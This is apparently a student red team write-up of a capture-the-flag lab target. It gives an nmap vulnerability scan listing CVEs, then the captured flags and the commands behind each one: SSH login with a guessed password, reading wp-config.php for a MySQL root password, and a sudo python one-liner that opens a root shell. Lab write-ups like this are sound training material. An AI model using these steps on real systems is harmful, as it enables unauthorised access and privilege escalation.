# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -sV --script=/usr/share/nmap/scripts/vulners.nse 192.168.1.110
Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-06 10:29 PST
Nmap scan report for 192.168.1.110
Host is up (0.0016s latency).
Not shown: 995 closed ports
PORT	STATE SERVICE 	VERSION
22/tcp  open  ssh     	OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| vulners:
|   cpe:/a:openbsd:openssh:6.7p1:
|   	CVE-2015-5600   8.5 	https://vulners.com/cve/CVE-2015-5600
|   	EDB-ID:40888	7.8 	https://vulners.com/exploitdb/EDB-ID:40888  	*EXPLOIT*
|   	EDB-ID:41173	7.2 	https://vulners.com/exploitdb/EDB-ID:41173  	*EXPLOIT*
|   	CVE-2015-6564   6.9 	https://vulners.com/cve/CVE-2015-6564
|   	CVE-2018-15919  5.0 	https://vulners.com/cve/CVE-2018-15919
|   	CVE-2017-15906  5.0 	https://vulners.com/cve/CVE-2017-15906
|   	SSV:90447   	4.6 	https://vulners.com/seebug/SSV:90447	*EXPLOIT*
|   	EDB-ID:45233	4.6 	https://vulners.com/exploitdb/EDB-ID:45233  	*EXPLOIT*
|   	EDB-ID:45210	4.6 	https://vulners.com/exploitdb/EDB-ID:45210  	*EXPLOIT*
|   	EDB-ID:45001	4.6 	https://vulners.com/exploitdb/EDB-ID:45001  	*EXPLOIT*
|   	EDB-ID:45000	4.6 	https://vulners.com/exploitdb/EDB-ID:45000  	*EXPLOIT*
|   	EDB-ID:40963	4.6 	https://vulners.com/exploitdb/EDB-ID:40963  	*EXPLOIT*
|   	EDB-ID:40962	4.6 	https://vulners.com/exploitdb/EDB-ID:40962  	*EXPLOIT*
|   	CVE-2016-0778   4.6 	https://vulners.com/cve/CVE-2016-0778
|   	CVE-2020-14145  4.3 	https://vulners.com/cve/CVE-2020-14145
|   	CVE-2015-5352   4.3 	https://vulners.com/cve/CVE-2015-5352
|   	CVE-2016-0777   4.0 	https://vulners.com/cve/CVE-2016-0777
|_  	CVE-2015-6563   1.9 	https://vulners.com/cve/CVE-2015-6563
80/tcp  open  http    	Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
| vulners:
|   cpe:/a:apache:http_server:2.4.10:
|   	CVE-2017-7679   7.5 	https://vulners.com/cve/CVE-2017-7679
|   	CVE-2017-7668   7.5 	https://vulners.com/cve/CVE-2017-7668
|   	CVE-2017-3169   7.5 	https://vulners.com/cve/CVE-2017-3169
|   	CVE-2017-3167   7.5 	https://vulners.com/cve/CVE-2017-3167
|   	CVE-2018-1312   6.8 	https://vulners.com/cve/CVE-2018-1312
|   	CVE-2017-15715  6.8 	https://vulners.com/cve/CVE-2017-15715
|   	CVE-2017-9788   6.4 	https://vulners.com/cve/CVE-2017-9788
|   	CVE-2019-0217   6.0 	https://vulners.com/cve/CVE-2019-0217
|   	EDB-ID:47689	5.8 	https://vulners.com/exploitdb/EDB-ID:47689  	*EXPLOIT*
|   	CVE-2020-1927   5.8 	https://vulners.com/cve/CVE-2020-1927
|   	CVE-2019-10098  5.8 	https://vulners.com/cve/CVE-2019-10098
|   	1337DAY-ID-33577    	5.8 	https://vulners.com/zdt/1337DAY-ID-33577    	*EXPLOIT*
|   	CVE-2016-5387   5.1 	https://vulners.com/cve/CVE-2016-5387
|   	SSV:96537   	5.0 	https://vulners.com/seebug/SSV:96537	*EXPLOIT*
|   	MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED  5.0 	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED  	*EXPLOIT*
|   	EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7	5.0 	https://vulners.com/exploitpack/EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7   	*EXPLOIT*
|   	EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	5.0 	https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D   	*EXPLOIT*
|   	CVE-2020-1934   5.0 	https://vulners.com/cve/CVE-2020-1934
|   	CVE-2019-0220   5.0 	https://vulners.com/cve/CVE-2019-0220
|   	CVE-2018-17199  5.0 	https://vulners.com/cve/CVE-2018-17199
|   	CVE-2018-17189  5.0 	https://vulners.com/cve/CVE-2018-17189
|   	CVE-2018-1303   5.0 	https://vulners.com/cve/CVE-2018-1303
|   	CVE-2017-9798   5.0 	https://vulners.com/cve/CVE-2017-9798
|   	CVE-2017-15710  5.0 	https://vulners.com/cve/CVE-2017-15710
|   	CVE-2016-8743   5.0 	https://vulners.com/cve/CVE-2016-8743
|   	CVE-2016-2161   5.0 	https://vulners.com/cve/CVE-2016-2161
|   	CVE-2016-0736   5.0 	https://vulners.com/cve/CVE-2016-0736
|   	CVE-2015-3183   5.0 	https://vulners.com/cve/CVE-2015-3183
|   	CVE-2015-0228   5.0 	https://vulners.com/cve/CVE-2015-0228
|   	CVE-2014-3583   5.0 	https://vulners.com/cve/CVE-2014-3583
|   	1337DAY-ID-28573    	5.0 	https://vulners.com/zdt/1337DAY-ID-28573    	*EXPLOIT*
|   	1337DAY-ID-26574    	5.0 	https://vulners.com/zdt/1337DAY-ID-26574    	*EXPLOIT*
|   	EDB-ID:47688	4.3 	https://vulners.com/exploitdb/EDB-ID:47688  	*EXPLOIT*
|   	CVE-2020-11985  4.3 	https://vulners.com/cve/CVE-2020-11985
|   	CVE-2019-10092  4.3 	https://vulners.com/cve/CVE-2019-10092
|   	CVE-2018-1302   4.3 	https://vulners.com/cve/CVE-2018-1302
|   	CVE-2018-1301   4.3 	https://vulners.com/cve/CVE-2018-1301
|   	CVE-2016-4975   4.3 	https://vulners.com/cve/CVE-2016-4975
|   	CVE-2015-3185   4.3 	https://vulners.com/cve/CVE-2015-3185
|   	CVE-2014-8109   4.3 	https://vulners.com/cve/CVE-2014-8109
|   	1337DAY-ID-33575    	4.3 	https://vulners.com/zdt/1337DAY-ID-33575    	*EXPLOIT*
|   	CVE-2018-1283   3.5 	https://vulners.com/cve/CVE-2018-1283
|   	CVE-2016-8612   3.3 	https://vulners.com/cve/CVE-2016-8612
|   	PACKETSTORM:140265  	0.0 	https://vulners.com/packetstorm/PACKETSTORM:140265  	*EXPLOIT*
|   	EDB-ID:42745	0.0 	https://vulners.com/exploitdb/EDB-ID:42745  	*EXPLOIT*
|   	EDB-ID:40961	0.0 	https://vulners.com/exploitdb/EDB-ID:40961  	*EXPLOIT*
|   	1337DAY-ID-601  0.0 	https://vulners.com/zdt/1337DAY-ID-601  *EXPLOIT*
|   	1337DAY-ID-2237 0.0 	https://vulners.com/zdt/1337DAY-ID-2237 *EXPLOIT*
|   	1337DAY-ID-1415 0.0 	https://vulners.com/zdt/1337DAY-ID-1415 *EXPLOIT*
|_  	1337DAY-ID-1161 0.0 	https://vulners.com/zdt/1337DAY-ID-1161 *EXPLOIT*
111/tcp open  rpcbind 	2-4 (RPC #100000)
| rpcinfo:
|   program version	port/proto  service
|   100000  2,3,4    	111/tcp   rpcbind
|   100000  2,3,4    	111/udp   rpcbind
|   100000  3,4      	111/tcp6  rpcbind
|   100000  3,4      	111/udp6  rpcbind
|   100024  1      	43056/udp   status
|   100024  1      	47919/tcp6  status
|   100024  1      	49985/udp6  status
|_  100024  1      	55630/tcp   status
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 00:15:5D:00:04:10 (Microsoft)
Service Info: Host: TARGET1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.17 seconds

```

This scan identifies the services below as potential points of entry:
- Target 1
  - OpenSSh
  - Apache
  - rpcbind
  - Samba

### Critical Vulnerabilities

The following vulnerabilities were identified on each target:
- Target 1
  - weak passwords/password reuse
  - outdated wordpress installation

### Exploitation
The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: flag1{b9bbcb33e11b80be759c4e844862482d}
    - **Exploit Used**
      - This was in a file, this was found post exploitation, and found after flag2.txt was found
  - `flag2.txt`: flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
    - **Exploit Used**
      - SSH Credential Theft
      - ssh michael@192.168.1.110 -p michael
  - `flag3.txt`: flag3{afc01ab56b50591e7dccf93122770cd2}
    - **Exploit Used**
      - Enumeration
      - cat wp-config.php
      - mysql -u root -p R@v3nSecurity
  - `flag4.txt`: flag4{715dea6c055b9fe3337544932f2941ce}
    - **Exploit Used**
      - Using Sudo to Escalate Privileges
      - sudo python -c 'import os; os.system("sudo -i")'
